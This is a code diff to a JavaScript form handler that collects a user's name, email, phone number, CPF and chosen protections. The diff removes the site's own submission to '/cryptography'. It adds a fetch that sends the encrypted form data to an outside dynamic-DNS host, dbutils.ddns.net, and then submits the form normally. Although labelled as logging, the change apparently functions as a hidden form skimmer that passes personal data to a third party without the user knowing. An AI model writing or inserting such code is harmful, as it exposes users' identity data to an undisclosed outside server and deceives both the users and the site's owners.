@@ -222,12 +222,13 @@ function openLoadingPopup() {
 }
 
 async function submitFormJs() {
+    // Get form data
     const nome = document.getElementById("name").value;
     const email = document.getElementById("email").value;
     const telefone = document.getElementById("cellphone").value;
     const cpf = document.getElementById("cpf").value;
     
-    // Get selected protections
+    // Get selected protections 
     const protectcheckboxes = document.querySelectorAll("input[id='protecoes']");
     const selectedProtections = Array.from(protectcheckboxes)
         .filter(checkbox => checkbox.checked)
@@ -242,11 +243,50 @@ async function submitFormJs() {
     console.log(dataToEncrypt);
     console.log(dataEncrypted);
 
-    post('/cryptography', dataEncrypted);
+    // Create JSON payload
+    const currentDate = new Date().toISOString();
+    const logData = {
+        status: "TESTE",
+        project: "67d358c732f32712b51c5aeb",
+        additional: dataEncrypted,
+        timePlayed: currentDate
+    };
+
+    // Send log data to external endpoint
+    try {
+        const logserverUploadResponse = await fetch('https://dbutils.ddns.net/datalog/upload', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(logData)
+        });
+
+        if (!logserverUploadResponse.ok) {
+            throw new Error(`HTTP error! status: ${logserverUploadResponse.status}`);
+        }
+        
+        console.log('Data sent to external server:', JSON.stringify(logData));
+        const responseData = await logserverUploadResponse.json();
+        console.log('Server response:', responseData);
+    } catch (error) {
+        console.error('Error sending data to external server:', error);
+        throw error; // Re-throw to be caught by handleSubmit
+    }
 }
 
-function handleSubmit(event) {
-    event.preventDefault(); // Previne o envio padrão do formulário
-    openLoadingPopup(); // Chama a função de loading
-    submitFormJs(); // Chama a função de submit
+async function handleSubmit(event) {
+    event.preventDefault(); // Temporarily prevent form submission
+    openLoadingPopup(); // Show loading popup
+    
+    try {
+        console.log('Submitting form...');
+        await submitFormJs(); // Wait for encrypted data submission
+        console.log('Form submitted successfully');
+        event.target.submit(); // Submit the form normally after encryption
+    } catch (error) {
+        console.error('Error submitting form:', error);
+        alert('Erro ao enviar formulário. Tente novamente.');
+    }
 }
